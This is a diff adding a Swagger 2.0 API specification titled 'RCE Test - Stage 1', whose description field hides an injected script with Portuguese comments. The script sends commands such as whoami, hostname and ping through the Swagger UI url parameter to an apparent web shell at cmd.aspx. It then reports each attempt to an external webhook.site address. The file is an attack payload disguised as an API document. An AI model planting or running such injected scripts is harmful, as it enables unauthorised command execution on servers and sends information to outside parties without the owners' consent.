@@ -1,0 +1,37 @@
+swagger: "2.0"
+info:
+  title: "RCE Test - Stage 1"
+  description: |
+    <script>
+      // Primeiro: testar se comandos básicos funcionam
+      var testCommands = [
+        'ping -n 1 8.8.8.8',  // Windows
+        'ping -c 1 8.8.8.8',  // Linux
+        'whoami',
+        'hostname',
+        'echo test'
+      ];
+      
+      testCommands.forEach(cmd => {
+        // Tentar via possível RCE
+        var attackUrl = '/api/swagger/index.html?url=' + 
+          encodeURIComponent('http://localhost/cmd.aspx?cmd=' + encodeURIComponent(cmd));
+        
+        fetch(attackUrl, {mode: 'no-cors'})
+          .then(() => {
+            console.log('Attempted:', cmd);
+            // Registrar no webhook
+            fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5?cmd=' + 
+                  encodeURIComponent(cmd), {mode: 'no-cors'});
+          });
+      });
+      
+      alert('RCE tests initiated - check webhook');
+    </script>
+paths:
+  /test:
+    get:
+      summary: "Test"
+      responses:
+        200:
+          description: "OK"
